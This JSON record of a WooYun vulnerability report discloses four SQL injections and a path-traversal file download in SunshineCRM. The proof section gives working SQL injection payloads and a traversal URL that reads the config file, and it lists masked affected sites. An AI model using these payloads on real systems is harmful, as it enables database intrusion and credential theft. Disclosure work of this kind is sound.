{"id": 84859, "wybug_id": "wooyun-2015-0140006", "wybug_title": "单点开源CRM系统多个漏洞打包#影响众多企业", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-09-13 09:25", "wybug_open_date": "2015-12-14 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述：  详细说明：  　　郑州单点科技(官网自行百度)应该隶属于通达旗下的吧？毕竟看到开源CRM的下载地址用的是通达的域名。单点开源免费CRM系统是单点科技开发的，基于GPLv3协议发行，针对中小企业管理活动，提供客户关系管理员(CRM)，进销存 (JXC),人力资源(HRM)，后勤(办公用品，固定资产，公物维修)、物业管理等功能，软件开源免费，争取打造中国开源CRM软件 第一品牌。开源CRM本地集成一键式安装包：\nhttp://**.**.**.**/OA_train/%E9%80%9A%E8%BE%BEOA%E5%8F%AF%E9%80%89%E7%BB%84%E4%BB%B6/%E6%94%B6%E8%B4%B9%E7%BB%84%E4%BB%B6-%E8%AF%95%E7%94%A8%E7%89%88/%E9%80%9A%E8%BE%BEOA%E6%95%99%E8%82%B2%E7%AE%A1%E7%90%86%E7%BB%84%E4%BB%B6/%E5%8D%95%E7%82%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FSunshineCRM%E5%AE%89%E8%A3%85%E5%8C%85.exe\n漏洞总共是4处SQL注入与1处任意文件下载：\n1、/general/ERP/Enginee/Module/user_select/tree.php?DEPT_ID=       DEPT_ID参数存在注入2、/general/ERP/Enginee/Module/user_select_single/tree.php?DEPT_ID=     DEPT_ID参数存在注入3、/general/ERP/Enginee/Module/user_select/user_online.php?UID_STR=1    UID_STR参数存在注入4、/general/ERP/Development/main.php?Tablename=kaccessbank&FileIniname=accessban     Tablename参数存在注入5、/general/ERP/Framework/download.php?   action=download&attachmentid=1&attachmentname=..%252f..%252f..%252f..%252fmyerp%252fconfig.inc.php  任意文件下载\nError\n错误#1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' order by DEPT_NO' at line 1SQL语句: SELECT * from department where DEPT_PARENT=''' order by DEPT_NO文件:\nCase:影响众多企业的CRM，考虑安全枚举部分：\n\nmask 区域\n1.http://**.**.**/general/ERP/LOGIN/index.php_2.http://**.**.**/general/ERP/LOGIN/index.php_3.http://**.**.**//general/ERP/LOGIN/index.php_4.http://**.**.**/general/ERP/LOGIN/index.php_5.http://**.**.**/general/ERP/LOGIN/index.php_6.http://**.**.**/general/ERP/LOGIN/_7.http://**.**.**/general/ERP/LOGIN/_8.http://**.**.**/app/SunshineCRM/general/ERP/LOGIN/_9.http://**.**.**/general/ERP/LOGIN/_*****eral/ERP*****10.http://**.**.**/general/ERP/LOGIN/_11.http://**.**.**/general/ERP/LOGIN/_12.http://**.**.**/general/ERP/LOGIN/_13.http://**.**.**/crm/general/ERP/LOGIN/index.php_14.http://**.**.**/general/ERP/LOGIN/index.php_15.http://**.**.**/crm/general/ERP/LOGIN/index.php_***************节%df ^*****16.http://**.**.**/general/ERP/LOGIN/_17.http://**.**.**/xcmr/general/ERP/LOGIN/_18.http://**.**.**/general/ERP/LOGIN/_19.http://**.**.**/general/ERP/LOGIN/_20.http://**.**.**/general/ERP/LOGIN/_21.http://**.**.**/general/ERP/LOGIN/_22.http://**.**.**/erp/general/ERP/LOGIN/_23.http://**.**.**/general/ERP/LOGIN/_24.http://**.**.**/general/ERP/LOGIN/_25.http://**.**.**/general/ERP/LOGIN/_26.http://**.**.**/general/ERP/LOGIN/_27.http://**.**.**/general/ERP/LOGIN/index.php_28.http://**.**.**/general/ERP/LOGIN/index.php\n\n   漏洞证明：  Security Testing:本页的漏洞详情主要由乌云转交Cncert、CNVD通报厂商处理，非教唆利用方式，请勿仿照此漏洞恶意攻击入侵站点行为，由此造成的后果，本漏洞提交者概不负责。\n1、上述案例中因版本的问题有些需要加入宽字节来注入，本地下载安装包就是该类版本。比如说不需要宽字节注入的；测试Payload如下：' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YDTF'='YDTF\n\n对于需要宽字节注入的测试Payload:%df'UNION ALL SELECT NULL,CONCAT(0x7c,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x7c),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%23\n\n\n\n2、第二处与第一处类似，不测试了3、测试Payload:1') AND (SELECT 1735 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('SjdM'='SjdM\n\n\n\n宽字节测试Payload:%df') UNION ALL SELECT NULL,CONCAT(0x7c,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x7c),NULL,NULL%23\n\n\n\n4、/general/ERP/Development/main.php?Tablename=kaccessbank&FileIniname=accessban非宽字节测试Payload:' AND (SELECT 7582 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'cqiW'='cqiW&FileIniname=accessban\n\n\n\n5、任意文件下载可能因为权限问题，在本地测试是成功的，PHP代码如下：$attachmentid = $_GET[attachmentid];$attachmentname = $_GET[attachmentname];if ( $_GET['action'] == \"download\" ){                                $pathname = \"../attachment/\".$attachmentid.\"/\".urldecode( $attachmentname ).\"\";                                                     is_file( $pathname ) ? \"\" : ( $pathname = \"attachment/\".$attachmentid.\"/\".urldecode( $attachmentname ).\"\" );                                if ( is_file( $pathname ) )                                {                                                                $filesize = filesize( $pathname );                                                                $file = fopen( $pathname, \"r\" );                                                                header( \"Pragma: no-cache\" );                                                                header( \"Cache-control: private\" );                                                                header( \"Content-type: application/octet-stream\" );                                                                header( \"Content-Length: {$filesize}\" );                                                                header( \"Content-Disposition: attachment; filename=\\\"\".urldecode( $attachmentname ).\"\\\"\" );                                                                header( \"Content-Description: \".$_SERVER['SERVER_NAME'] );                                                                echo fread( $file, $filesize );                                                                fclose( $file );                                                                exit( );                                }构造Payload:http://localhost:81/general/ERP/Framework/download.php?action=download&attachmentid=1&attachmentname=..%252f..%252f..%252f..%252fmyerp%252fconfig.inc.php\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-09-15 14:53 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商（或网站管理单位）的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}